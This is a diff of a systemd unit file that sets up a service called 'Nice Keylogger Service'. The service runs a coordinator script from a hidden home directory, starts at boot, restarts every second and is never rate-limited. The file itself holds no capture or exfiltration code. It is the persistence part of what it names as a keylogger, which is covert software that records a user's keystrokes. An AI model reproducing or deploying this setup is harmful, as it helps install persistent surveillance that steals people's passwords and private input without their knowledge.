@@ -1,16 +1,14 @@
 [Unit]
-Description="Nice Keylogger Service"
-After=network-online.target
-Wants=network-online.target
+Description=Nice Keylogger Service
+After=network.target
+StartLimitIntervalSec=0
 
 [Service]
-SyslogIdentifier=nicekeylogger
-WorkingDirectory='~/nicekl/'
-# TODO confirm this directory works
 Type=simple
 Restart=always
 RestartSec=1
-ExecStart=/bin/sh coordinator.sh
+# TODO confirm this directory works
+ExecStart=~/nicekl/coordinator.sh
 
 [Install]
 WantedBy=multi-user.target
